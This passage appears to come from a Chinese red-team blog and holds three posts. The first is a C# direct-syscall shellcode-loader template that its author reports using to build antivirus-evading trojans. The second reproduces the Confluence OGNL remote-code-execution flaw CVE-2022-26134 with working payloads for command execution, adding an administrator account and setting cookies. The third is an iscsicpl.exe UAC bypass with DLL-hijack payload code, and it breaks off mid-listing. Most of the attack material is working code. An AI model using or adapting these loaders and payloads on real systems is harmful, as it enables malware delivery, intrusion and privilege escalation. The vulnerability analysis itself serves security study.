value to our syscall byte array                fixed (byte* ptr = syscall)                {                    // cast the byte array pointer into a C# IntPtr called memoryAddress                    IntPtr memoryAddress = (IntPtr)ptr;                    // Change memory access to RX for our assembly code                    if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, (uint)AllocationProtect.PAGE_EXECUTE_READWRITE, out uint oldprotect))                    {                        throw new Win32Exception();                    }                    // Get delegate for NtAllocateVirtualMemory                    Delegates.NtAllocateVirtualMemory assembledFunction = (Delegates.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtAllocateVirtualMemory));                    return (NTSTATUS)assembledFunction(                        ProcessHandle,                        ref BaseAddress,                        ZeroBits,                        ref RegionSize,                        AllocationType,                        Protect);                }            }        }        // https://securityxploded.com/ntcreatethreadex.php        //NTSTATUS NtCreateThreadEx(            // OUT PHANDLE hThread,                         // C#: out IntPtr            // IN ACCESS_MASK DesiredAccess,                // C#: ACCESS_MASK (Native.cs)            // IN LPVOID ObjectAttributes,                  // C#: IntPtr.Zero            // IN HANDLE ProcessHandle,                     // C#: IntPtr            // IN LPTHREAD_START_ROUTINE lpStartAddress,    // C#: IntPtr            // IN LPVOID lpParameter,                       // C#: IntPtr            // IN BOOL CreateSuspended,                     // C#: Boolean/Int            // IN ULONG StackZeroBits,                      // C#: uint            // IN ULONG SizeOfStackCommit,                  // C#: uint            // IN ULONG SizeOfStackReserve,                 // C#: uint            // OUT LPVOID lpBytesBuffer                     // C#: IntPtr            // );        /*   Windows 10 1909: 0xBD, Windows 10 2004: 0xC1   */        static byte[] bNtCreateThreadEx =        {            0x4c, 0x8b, 0xd1,               // mov r10,rcx        //    0xb8, 0xc1, 0x00, 0x00, 0x00,   // mov eax,0BDh            0xb8, 0xbd, 0x00, 0x00, 0x00,   // mov eax,0BDh            0x0F, 0x05,                     // syscall            0xC3                            // ret        };        public static NTSTATUS NtCreateThreadEx(            out IntPtr hThread,            ACCESS_MASK DesiredAccess,            IntPtr ObjectAttributes,            IntPtr ProcessHandle,            IntPtr lpStartAddress,            IntPtr lpParameter,            bool CreateSuspended,            uint StackZeroBits,            uint SizeOfStackCommit,            uint SizeOfStackReserve,            IntPtr lpBytesBuffer            )        {            // set byte array of bNtCreateThread to new byte array called syscall            byte[] syscall = bNtCreateThreadEx;            // specify unsafe context            unsafe            {                // create new byte pointer and set value to our syscall byte array                fixed (byte* ptr = syscall)                {                    // cast the byte array pointer into a C# IntPtr called memoryAddress                    IntPtr memoryAddress = (IntPtr)ptr;                    // Change memory access to RX for our assembly code                    if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, (uint)AllocationProtect.PAGE_EXECUTE_READWRITE, out uint oldprotect))                    {                        throw new Win32Exception();                    }                    // Get delegate for NtCreateThread                    Delegates.NtCreateThreadEx assembledFunction = (Delegates.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtCreateThreadEx));                    return (NTSTATUS)assembledFunction(                        out hThread,                        DesiredAccess,                        ObjectAttributes,                        ProcessHandle,                        lpStartAddress,                        lpParameter,                        CreateSuspended,                        StackZeroBits,                        SizeOfStackCommit,                        SizeOfStackReserve,                        lpBytesBuffer                        );                }            }        }        /*        MSDN:        NTSTATUS ZwWaitForSingleObject(            HANDLE Handle,             // C#: IntPtr            BOOLEAN Alertable,         // C#: Boolean            PLARGE_INTEGER Timeout     // C#: Int64            );        ReactOS:        NTSTATUS NtWaitForSingleObject(             In_ HANDLE Object,             In_ BOOLEAN Alertable,             In_opt_ PLARGE_INTEGER Time             ); */        /*   0x4 in all Windows 10 versions so far   */        static byte[] bNtWaitForSingleObject =        {            0x4c, 0x8b, 0xd1,               // mov r10,rcx            0xb8, 0x04, 0x00, 0x00, 0x00,   // mov eax,4            0x0F, 0x05,                     // syscall            0xC3                            // ret        };        public static NTSTATUS NtWaitForSingleObject(IntPtr Object, bool Alertable, uint Timeout)        {            // set byte array of bNtWaitForSingleObject to new byte array called syscall            byte[] syscall = bNtWaitForSingleObject;            // specify unsafe context            unsafe            {                // create new byte pointer and set value to our syscall byte array                fixed (byte* ptr = syscall)                {                    // cast the byte array pointer into a C# IntPtr called memoryAddress                    IntPtr memoryAddress = (IntPtr)ptr;                    // Change memory access to RX for our assembly code                    if (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, (uint)AllocationProtect.PAGE_EXECUTE_READWRITE, out uint oldprotect))                        {                        throw new Win32Exception();                    }                    // Get delegate for NtWaitForSingleObject                    Delegates.NtWaitForSingleObject assembledFunction = (Delegates.NtWaitForSingleObject)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtWaitForSingleObject));                    return (NTSTATUS)assembledFunction(Object, Alertable, Timeout);                }            }        }        public struct Delegates        {            [UnmanagedFunctionPointer(CallingConvention.StdCall)]            public delegate NTSTATUS NtAllocateVirtualMemory(                IntPtr ProcessHandle,                ref IntPtr BaseAddress,                IntPtr ZeroBits,                ref UIntPtr RegionSize,                ulong AllocationType,                ulong Protect);            [UnmanagedFunctionPointer(CallingConvention.StdCall)]            public delegate NTSTATUS NtCreateThreadEx(                out IntPtr hThread,                ACCESS_MASK DesiredAccess,                IntPtr ObjectAttributes,                IntPtr ProcessHandle,                IntPtr lpStartAddress,                IntPtr lpParameter,                bool CreateSuspended,                uint StackZeroBits,                uint SizeOfStackCommit,                uint SizeOfStackReserve,                IntPtr lpBytesBuffer                );            [UnmanagedFunctionPointer(CallingConvention.StdCall)]            public delegate NTSTATUS NtWaitForSingleObject(IntPtr Object, bool Alertable, uint Timeout);        }    }}</code></pre><p>NtAllocateVirtualMemory示例代码<br>不同的系统的syscall不一样，怎么样才能实现在不同系统里面动态调用</p><pre><code class="csharp">       public static uint GetSyscallID(string SysFunName)        {                     uint SyscallID = 0;                     IntPtr SyscallID_mem =  Marshal.AllocHGlobal(Marshal.SizeOf(SyscallID)); //先获取SyscallID的内存大小 再分配内存                     RtlZeroMemory(SyscallID_mem, Marshal.SizeOf(SyscallID)); //用0填充内存                     IntPtr hModule = GetModuleHandle(&quot;ntdll.dll&quot;); //获取ntdll基址                     IntPtr FunAddr = GetProcAddress(hModule, SysFunName); //获取API函数地址                     IntPtr CallAddr = FunAddr + 4; //获取系统调用编号地址                     uint temp;                     bool read_result = ReadProcessMemory(GetCurrentProcess(),  CallAddr, SyscallID_mem, 4, out temp); //读取内存编号                     // Console.WriteLine(&quot;Error: &quot; +  Marshal.GetLastWin32Error());                     // Console.WriteLine(&quot;CallAddr：&quot; + CallAddr + &quot;, SyscallID&quot;  + SyscallID + &quot;, temp: &quot; + temp);                     SyscallID = (uint)Marshal.ReadInt32(SyscallID_mem); //从非托管内存中读取 32 位有符号整数。支持从未对齐的内存位置读取 (相当于转成int)                     return SyscallID; //返回内存编号        }             public static byte[] SYSbyte1 =              {                     0x4c, 0x8b, 0xd1,          // 0x4c, 0x8b, 0xd1=mov r10,rcx、 0xb8=mov eax            0xb8              };              public static byte[] SYSbyte2 =              {                     0x00, 0x00, 0x00,   // 0x0F, 0x05=syscall、0xc3=ret            0x0F, 0x05,                                0xC3                                   };public static uint NtAllocateVirtualMemory              (                     IntPtr ProcessHandle,                     ref IntPtr BaseAddress,                     IntPtr ZeroBits,                     ref UIntPtr RegionSize,                     uint AllocationType,                     uint Protect              )              {                     // set byte array of bNtAllocateVirtualMemory to new byte  array called syscall                     uint SyscallID =  Auto_NativeCode.GetSyscallID(&quot;NtAllocateVirtualMemory&quot;);                     byte[] syscall1 = SYSbyte1;                     byte[] syscallid = { (byte)SyscallID };                     byte[] syscall2 = SYSbyte2;                     byte[] sysfinal =  syscall1.Concat(syscallid).Concat(syscall2).ToArray(); //拼接syscall汇编指令                     /*                     foreach(byte temp in sysfinal)            {                           Console.WriteLine(&quot;Sysfinal: &quot; + temp);                     }                     */                     // specify unsafe context                     unsafe                     {                           // create new byte pointer and set value to our  syscall byte array                           fixed (byte* ptr = sysfinal)                           {                                  // cast the byte array pointer into a C# IntPtr  called memoryAddress                                  IntPtr memoryAddress = (IntPtr)ptr;                                  // Change memory access to RX for our assembly  code                                  if  (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress,  (UIntPtr)sysfinal.Length, PAGE_EXECUTE_READWRITE, out uint oldprotect))                                  {                                         throw new Win32Exception();                                  }                                  // Get delegate for NtAllocateVirtualMemory                                  DelegatesStruct.NtAllocateVirtualMemory  assembledFunction =  (DelegatesStruct.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(DelegatesStruct.NtAllocateVirtualMemory));                                  return (uint)assembledFunction(                                         ProcessHandle,                                         ref BaseAddress,                                         ZeroBits,                                         ref RegionSize,                                         AllocationType,                                         Protect);                           }                     }              }</code></pre><p><img src="https://s1.ax1x.com/2022/11/22/zloDoj.png" alt=""></p><p>API Syscall声明-执行shellcode整套完整模板  - 来源代码：<a href="https://github.com/Kara-4search/SysCall_ShellcodeLoad_Csharp" target="_blank" rel="noopener">https://github.com/Kara-4search/SysCall_ShellcodeLoad_Csharp</a></p><pre><code class="csharp">using System;using System.Collections.Generic;using System.Linq;using System.Runtime.InteropServices;using System.Text;using System.Threading.Tasks;using System.Runtime.InteropServices;using System.ComponentModel;using System.Diagnostics;namespace SysCall_ShellcodeLoad{    class Auto_NativeCode    {              [DllImport(&quot;kernel32.dll&quot;)]              public static extern bool VirtualProtectEx              (                     IntPtr hProcess,                     IntPtr lpAddress,                     UIntPtr dwSize,                     uint flNewProtect,                     out uint lpflOldProtect               );              [DllImport(&quot;kernel32&quot;, CharSet = CharSet.Ansi, ExactSpelling = true,  SetLastError = true)]              static extern IntPtr GetProcAddress(IntPtr hModule, string  procName);              [DllImport(&quot;kernel32.dll&quot;, CharSet = CharSet.Auto)]              public static extern IntPtr GetModuleHandle(string lpModuleName);              [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]              public static extern IntPtr GetCurrentProcess();              [DllImport(&quot;kernel32.dll&quot;)]              public static extern void RtlZeroMemory(IntPtr pBuffer, int length);              [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]              static extern bool ReadProcessMemory(                     IntPtr hProcess,                     IntPtr lpBaseAddress,                     IntPtr lpBuffer,                     int dwSize,                     out uint lpNumberOfBytesRead              );              public uint NTSTATUS;              public static UInt32 PAGE_EXECUTE_READWRITE = 0x40;              // public uint SYSid = 0;              public static byte[] SYSbyte1 =              {                     0x4c, 0x8b, 0xd1,                           0xb8              };              public static byte[] SYSbyte2 =              {                     0x00, 0x00, 0x00,              0x0F, 0x05,                                0xC3                                   };              public enum AllocationType : ulong              {                     Commit = 0x1000,                     Reserve = 0x2000,                     Decommit = 0x4000,                     Release = 0x8000,                     Reset = 0x80000,                     Physical = 0x400000,                     TopDown = 0x100000,                     WriteWatch = 0x200000,                     LargePages = 0x20000000              }              public static uint GetSyscallID(string SysFunName)        {                     uint SyscallID = 0;                     IntPtr SyscallID_mem =  Marshal.AllocHGlobal(Marshal.SizeOf(SyscallID));                     RtlZeroMemory(SyscallID_mem, Marshal.SizeOf(SyscallID));                     IntPtr hModule = GetModuleHandle(&quot;ntdll.dll&quot;);                     IntPtr FunAddr = GetProcAddress(hModule, SysFunName);                     IntPtr CallAddr = FunAddr + 4;                     uint temp;                     bool read_result = ReadProcessMemory(GetCurrentProcess(),  CallAddr, SyscallID_mem, 4, out temp);                     // Console.WriteLine(&quot;Error: &quot; +  Marshal.GetLastWin32Error());                     // Console.WriteLine(&quot;CallAddr：&quot; + CallAddr + &quot;, SyscallID&quot;  + SyscallID + &quot;, temp: &quot; + temp);                     SyscallID = (uint)Marshal.ReadInt32(SyscallID_mem);                     Console.WriteLine(&quot;SyscallID:{0:x}&quot;,SyscallID);                     return SyscallID;        }              public static uint NtAllocateVirtualMemory              (                     IntPtr ProcessHandle,                     ref IntPtr BaseAddress,                     IntPtr ZeroBits,                     ref UIntPtr RegionSize,                     uint AllocationType,                     uint Protect              )              {                     // set byte array of bNtAllocateVirtualMemory to new byte  array called syscall                     uint SyscallID =  Auto_NativeCode.GetSyscallID(&quot;NtAllocateVirtualMemory&quot;);                     byte[] syscall1 = SYSbyte1;                     byte[] syscallid = { (byte)SyscallID };                     byte[] syscall2 = SYSbyte2;                     byte[] sysfinal =  syscall1.Concat(syscallid).Concat(syscall2).ToArray();                     /*                     foreach(byte temp in sysfinal)            {                           Console.WriteLine(&quot;Sysfinal: &quot; + temp);                     }                     */                     // specify unsafe context                     unsafe                     {                           // create new byte pointer and set value to our  syscall byte array                           fixed (byte* ptr = sysfinal)                           {                                  // cast the byte array pointer into a C# IntPtr  called memoryAddress                                  IntPtr memoryAddress = (IntPtr)ptr;                                  // Change memory access to RX for our assembly  code                                  if  (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress,  (UIntPtr)sysfinal.Length, PAGE_EXECUTE_READWRITE, out uint oldprotect))                                  {                                         throw new Win32Exception();                                  }                                  // Get delegate for NtAllocateVirtualMemory                                  DelegatesStruct.NtAllocateVirtualMemory  assembledFunction =  (DelegatesStruct.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(DelegatesStruct.NtAllocateVirtualMemory));                                  return (uint)assembledFunction(                                         ProcessHandle,                                         ref BaseAddress,                                         ZeroBits,                                         ref RegionSize,                                         AllocationType,                                         Protect);                           }                     }              }              public static uint NtCreateThreadEx           (                  out IntPtr hThread,                  uint DesiredAccess,                  IntPtr ObjectAttributes,                  IntPtr ProcessHandle,                  IntPtr lpStartAddress,                  IntPtr lpParameter,                  bool CreateSuspended,                  uint StackZeroBits,                  uint SizeOfStackCommit,                  uint SizeOfStackReserve,                  IntPtr lpBytesBuffer           )              {                     // set byte array of bNtCreateThread to new byte array called  syscall                     uint SyscallID =  Auto_NativeCode.GetSyscallID(&quot;NtCreateThreadEx&quot;);                     byte[] syscall1 = SYSbyte1;                     byte[] syscallid = { (byte)SyscallID };                     byte[] syscall2 = SYSbyte2;                     byte[] sysfinal =  syscall1.Concat(syscallid).Concat(syscall2).ToArray();                     // specify unsafe context                     unsafe                     {                           // create new byte pointer and set value to our  syscall byte array                           fixed (byte* ptr = sysfinal)                           {                                  // cast the byte array pointer into a C# IntPtr  called memoryAddress                                  IntPtr memoryAddress = (IntPtr)ptr;                                  // Change memory access to RX for our assembly  code                                  if  (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress,  (UIntPtr)sysfinal.Length, PAGE_EXECUTE_READWRITE, out uint oldprotect))                                  {                                         throw new Win32Exception();                                  }                                  // Get delegate for NtCreateThread                                  DelegatesStruct.NtCreateThreadEx  assembledFunction =  (DelegatesStruct.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(DelegatesStruct.NtCreateThreadEx));                                  return (uint)assembledFunction(                                         out hThread,                                         DesiredAccess,                                         ObjectAttributes,                                         ProcessHandle,                                         lpStartAddress,                                         lpParameter,                                         CreateSuspended,                                         StackZeroBits,                                         SizeOfStackCommit,                                         SizeOfStackReserve,                                         lpBytesBuffer                                   );                           }                     }              }              public static uint NtWaitForSingleObject(IntPtr Object, bool  Alertable, uint Timeout)              {                     // set byte array of bNtWaitForSingleObject to new byte array  called syscall                     uint SyscallID =  Auto_NativeCode.GetSyscallID(&quot;NtWaitForSingleObject&quot;);                     byte[] syscall1 = SYSbyte1;                     byte[] syscallid = { (byte)SyscallID };                     byte[] syscall2 = SYSbyte2;                     byte[] sysfinal =  syscall1.Concat(syscallid).Concat(syscall2).ToArray();                     // specify unsafe context                     unsafe                     {                           // create new byte pointer and set value to our  syscall byte array                           fixed (byte* ptr = sysfinal)                           {                                  // cast the byte array pointer into a C# IntPtr  called memoryAddress                                  IntPtr memoryAddress = (IntPtr)ptr;                                  // Change memory access to RX for our assembly  code                                  if  (!VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress,  (UIntPtr)sysfinal.Length, PAGE_EXECUTE_READWRITE, out uint oldprotect))                                  {                                         throw new Win32Exception();                                  }                                  // Get delegate for NtWaitForSingleObject                                  DelegatesStruct.NtWaitForSingleObject  assembledFunction =  (DelegatesStruct.NtWaitForSingleObject)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(DelegatesStruct.NtWaitForSingleObject));                                  return (uint)assembledFunction(Object,  Alertable, Timeout);                           }                     }              }              public struct DelegatesStruct              {                     [UnmanagedFunctionPointer(CallingConvention.StdCall)]                     public delegate uint NtAllocateVirtualMemory(                           IntPtr ProcessHandle,                           ref IntPtr BaseAddress,                           IntPtr ZeroBits,                           ref UIntPtr RegionSize,                           ulong AllocationType,                           ulong Protect);                     [UnmanagedFunctionPointer(CallingConvention.StdCall)]                     public delegate uint NtCreateThreadEx(                           out IntPtr hThread,                           uint DesiredAccess,                           IntPtr ObjectAttributes,                           IntPtr ProcessHandle,                           IntPtr lpStartAddress,                           IntPtr lpParameter,                           bool CreateSuspended,                           uint StackZeroBits,                           uint SizeOfStackCommit,                           uint SizeOfStackReserve,                           IntPtr lpBytesBuffer                           );                     [UnmanagedFunctionPointer(CallingConvention.StdCall)]                     public delegate uint NtWaitForSingleObject(IntPtr Object,  bool Alertable, uint Timeout);              }       }}</code></pre><p>最后就是实现shellcode执行，按照C翻译就行。或者CV<br><img src="https://s1.ax1x.com/2022/11/22/zlo6Wq.png" alt=""></p><p><img src="https://s1.ax1x.com/2022/11/22/zlogS0.png" alt=""></p><p>在项目里面用这个模板做的几个马，免杀效果都不错<br><img src="https://s1.ax1x.com/2022/11/22/zlo2lV.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://jhalon.github.io/utilizing-syscalls-in-csharp-1/" target="_blank" rel="noopener">https://jhalon.github.io/utilizing-syscalls-in-csharp-1/</a><br><a href="https://jhalon.github.io/utilizing-syscalls-in-csharp-2/" target="_blank" rel="noopener">https://jhalon.github.io/utilizing-syscalls-in-csharp-2/</a><br><a href="https://www.solomonsklash.io/syscalls-for-shellcode-injection.html" target="_blank" rel="noopener">https://www.solomonsklash.io/syscalls-for-shellcode-injection.html</a><br><a href="https://github.com/SolomonSklash/SyscallPOC" target="_blank" rel="noopener">https://github.com/SolomonSklash/SyscallPOC</a><br><a href="https://github.com/Kara-4search/SysCall_ShellcodeLoad_Csharp" target="_blank" rel="noopener">https://github.com/Kara-4search/SysCall_ShellcodeLoad_Csharp</a></p>]]></content>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CVE-2022-26134 Confluence OGNL RCE 漏洞复现</title>
      <link href="/posts/9c6a5f14.html"/>
      <url>/posts/9c6a5f14.html</url>
      <content type="html"><![CDATA[<h2 id="漏洞范围"><a href="#漏洞范围" class="headerlink" title="漏洞范围"></a>漏洞范围</h2><p>Confluence Server and Data Center &gt;= 1.3.0<br>Confluence Server and Data Center &lt; 7.4.17<br>Confluence Server and Data Center &lt; 7.13.7<br>Confluence Server and Data Center &lt; 7.14.3<br>Confluence Server and Data Center &lt; 7.15.2<br>Confluence Server and Data Center &lt; 7.16.4<br>Confluence Server and Data Center &lt; 7.17.4<br>Confluence Server and Data Center &lt; 7.18.1</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>docker环境</p><pre><code>docker-compose.ymlversion: &#39;2&#39;services:  web:    image: vulhub/confluence:7.13.6    ports:      - &quot;8090:8090&quot;      - &quot;5050:5050&quot;    depends_on:      - db  db:    image: postgres:12.8-alpine    environment:    - POSTGRES_PASSWORD=postgres    - POSTGRES_DB=confluence</code></pre><p>docker搭好后<br><img src="https://s1.ax1x.com/2022/08/13/vY5EOU.png" alt=""></p><p>搭建好之后还需要去注册账号获取临时KEY来激活<br>参考链接：<a href="https://www.modb.pro/db/431731" target="_blank" rel="noopener">https://www.modb.pro/db/431731</a></p><p>安装过程<br><img src="https://s1.ax1x.com/2022/08/13/vY5KYR.png" alt=""></p><p>安装成功后<br><img src="https://s1.ax1x.com/2022/08/13/vY52kj.png" alt=""></p><p>在容器中/opt/atlassian/confluence/bin目录下修改setenv.sh文件，加入远程调试配置。</p><pre><code>CATALINA_OPTS=&quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5050 ${CATALINA_OPTS}&quot;</code></pre><p><img src="https://s1.ax1x.com/2022/08/13/vY5Whn.png" alt=""></p><p>进入容器后将/opt/atlassian目录下的confluence源码使用docker cp命令复制到本地。<br>使用IDEA将/confluence/WEB-INF下的atlassian-bundled-plugins、atlassian-bundled-plugins-setup、lib文件拉取为依赖文件<br><img src="https://s1.ax1x.com/2022/08/13/vY5410.png" alt=""></p><p>idea远程调试设置<br><img src="https://s1.ax1x.com/2022/08/13/vY55cV.png" alt=""></p><p>之后在com/opensymphony/webwork/dispatcher/ServletDispatcher.class第85行下断点(service函数)<br><img src="https://s1.ax1x.com/2022/08/13/vY5TnU.png" alt=""></p><p>为什么在ServletDispatcher下断点？运维所有的.action最后的servlet指向了，com.atlassian.confluence.servlet.ConfluenceServletDispatcher类，而ConfluenceServletDispatcher继承了ServletDispatcher<br><img src="https://s1.ax1x.com/2022/08/13/vY5qAJ.png" alt=""></p><p><img src="https://s1.ax1x.com/2022/08/13/vY5v1x.png" alt=""></p><h2 id="动态调试过程"><a href="#动态调试过程" class="headerlink" title="动态调试过程"></a>动态调试过程</h2><p>1.com/opensymphony/webwork/dispatcher/ServletDispatcher调用com/atlassian/confluence/servlet/ConfluenceServletDispatcher.classserviceAction函数<br><img src="https://s1.ax1x.com/2022/08/13/vY5zjK.png" alt=""></p><p>2.创建一个hash表把传进的全部作为hash表默认值，变量名为extraContext<br>3.put变量名为com.opensymphony.xwork.dispatcher.ServletDispatcher，值是自身对象<br>4.调用DefaultActionProxy里的createActionProxy传入namespace，actionName,extraContext 变量名为proxy<br>5.调用proxy的execute函数<br><img src="https://s1.ax1x.com/2022/08/13/vYICHe.png" alt=""><br><img src="https://s1.ax1x.com/2022/08/13/vYIFNd.png" alt=""></p><p>DefaultActionProxy里的execute函数<br>1.获取ActionContext对象实例 （DefaultActioninvocation）<br>2.调用该对象的invoke函数<br><img src="https://s1.ax1x.com/2022/08/13/vYIk4A.png" alt=""></p><p>DefaultActioninvocation invoke函数<br>1.遍历this.interceptors.hasNext() hash表 （该hash表存着所有类对象）<br>2.当resultCode为notpermitted时，退出循环<br><img src="https://s1.ax1x.com/2022/08/13/vYIZgP.png" alt=""></p><p>6.进入到ActionChainResult类里的execute函数<br>7.this.namespace为我们传入的payload<br>8.OgnlValueStack stack变量获取OgnlValueStack对象<br>9.将stack和this.namespace传入TextParseUtil.translateVariables函数<br><img src="https://s1.ax1x.com/2022/08/13/vYI14s.png" alt=""></p><p>translateVariables函数<br>1.正则提取ONGL表达式<br>2.调用OgnlValueStack.findValue函数传入ONGL表达式 复制变量object o<br>3.执行完后返回内容<br><img src="https://s1.ax1x.com/2022/08/13/vYI8Cn.png" alt=""></p><p>OgnlValueStack.findValue函数<br>最后调用findValue函数对表达式进行解析<br><img src="https://s1.ax1x.com/2022/08/13/vYIJg0.png" alt=""><br>(不知道是不是远程调试的问题，这里断点o没返回执行命令的结果，文章里有）<br><img src="https://s1.ax1x.com/2022/08/13/vYIwE4.png" alt=""></p><h2 id="payload刨析"><a href="#payload刨析" class="headerlink" title="payload刨析"></a>payload刨析</h2><pre><code>GET //%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1Host: 192.168.3.88:8090Cache-Control: max-age=0DNT: 1Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: JSESSIONID=EA0CD27EDE8E10DD40A744E51514CB5FConnection: close</code></pre><p><img src="https://s1.ax1x.com/2022/08/13/vYIygx.png" alt=""></p><p>payload刨析<br>1.定义a变量调用Runtime.exec执行命令<br>2.将执行命令结果设置到返回头X-Cmd-Response</p><pre><code>//${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&quot;id&quot;).getInputStream(),&quot;utf-8&quot;)).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(&quot;X-Cmd-Response&quot;,#a))}/</code></pre><p>出处Y4er的博客 <a href="https://y4er.com/post/cve-2022-26134-confluence-server-data-center-ognl-rce/" target="_blank" rel="noopener">https://y4er.com/post/cve-2022-26134-confluence-server-data-center-ognl-rce/</a><br>添加用户的payload</p><pre><code>${#this.getUserAccessor().addUser(&#39;test&#39;,&#39;test@1234&#39;,&#39;test@gmail.com&#39;,&#39;Test&#39;,@com.atlassian.confluence.util.GeneralUtil@splitCommaDelimitedString(&quot;confluence-administrators,confluence-users&quot;))}</code></pre><p>设置cookie payload</p><pre><code>${@com.atlassian.confluence.util.GeneralUtil@setCookie(&quot;key&quot;,&quot;value&quot;)}</code></pre><p>EXP<br><a href="https://github.com/Nwqda/CVE-2022-26134" target="_blank" rel="noopener">https://github.com/Nwqda/CVE-2022-26134</a><br><a href="https://github.com/BeichenDream/CVE-2022-26134-Godzilla-MEMSHELL" target="_blank" rel="noopener">https://github.com/BeichenDream/CVE-2022-26134-Godzilla-MEMSHELL</a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.freebuf.com/vuls/335624.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/335624.html</a><br><a href="https://y4er.com/post/cve-2022-26134-confluence-server-data-center-ognl-rce/" target="_blank" rel="noopener">https://y4er.com/post/cve-2022-26134-confluence-server-data-center-ognl-rce/</a></p>]]></content>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>iscsicpl.exe ByPassUac复现</title>
      <link href="/posts/c08eee8b.html"/>
      <url>/posts/c08eee8b.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上午在推特逛街，看到了个这个bypassuac。复现了一下，写个笔记</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>lnk:<a href="https://www.ddosi.org/iscsicpl-bypassuac/" target="_blank" rel="noopener">https://www.ddosi.org/iscsicpl-bypassuac/</a><br>poc:<a href="https://github.com/hackerhouse-opensource/iscsicpl_bypassUAC/archive/refs/heads/main.zip" target="_blank" rel="noopener">https://github.com/hackerhouse-opensource/iscsicpl_bypassUAC/archive/refs/heads/main.zip</a><br><img src="https://s1.ax1x.com/2022/07/16/j4DSQ1.png" alt=""></p><p>c:\Windows\syswow64\iscsicpl.exe缺少iscsiexe.dll和iscsiexe_org.dll<br><img src="https://s1.ax1x.com/2022/07/16/j4Dpsx.png" alt=""><br><img src="https://s1.ax1x.com/2022/07/16/j4D9L6.png" alt=""></p><p>sigcheck检测,autoElevate为true。进程权限自提升<br><img src="https://s1.ax1x.com/2022/07/16/j4DFoD.png" alt=""></p><p>翻看代码，作者修改了注册表的HKEY_CURRENT_USER\Environment Path的键值为当前用户的TMP目录。看了一下这个注册表的键值和PATH环境变量最后一个路径对应，修改该注册表相当于直接动环境变量路径最后一个路径<br>HKEY_CURRENT_USER\Environment注册表路径参考链接：<a href="https://baike.baidu.com/item/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/1730949" target="_blank" rel="noopener">https://baike.baidu.com/item/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/1730949</a><br>（当然也可以直接修改windir环境变量，然后dll丢到对应目录）<br><img src="https://s1.ax1x.com/2022/07/16/j4DAFe.png" alt=""><br><img src="https://s1.ax1x.com/2022/07/16/j4DeSA.png" alt=""></p><p>重复说一下DLL加载顺序<br><img src="https://s1.ax1x.com/2022/07/16/j4DmQI.png" alt=""><br>直接加载iscsiexe.dl，会报缺少来自iscsiexe_org.dll的SvchostPushServiceGlobals、ServiceMain、DiscpEstablishServiceLinkage外部导出函数。<br><img src="https://s1.ax1x.com/2022/07/16/j4Dnyt.png" alt=""><br>github上poc的dll code<br>(DLL外部函数转发)</p><pre><code>// iscsiexe.cpp, the payload DLL executed by iscsicpl.exe#include &quot;pch.h&quot;#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#include &lt;tchar.h&gt;#include &quot;resource.h&quot;#pragma pack(1)// LoadString() for linker#pragma comment(lib,&quot;User32.lib&quot;)#define MAX_ENV_SIZE 32767BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID  lpReserved){    static HINSTANCE hL;    LPWSTR pCMD = new WCHAR[MAX_ENV_SIZE];    char pACMD[MAX_ENV_SIZE];    switch (ul_reason_for_call)    {    case DLL_PROCESS_ATTACH:              WinExec(&quot;C:\\Windows\\System32\\cmd.exe&quot;, SW_SHOW);        //hL = LoadLibrary(_T(&quot;.\\iscsiexe_org.dll&quot;));              /*        if (!hL)            return false;        // execute the command string from the module resource section        LoadString(GetModuleHandle(L&quot;iscsiexe.dll&quot;), IDS_CMD101, pCMD,  MAX_ENV_SIZE);        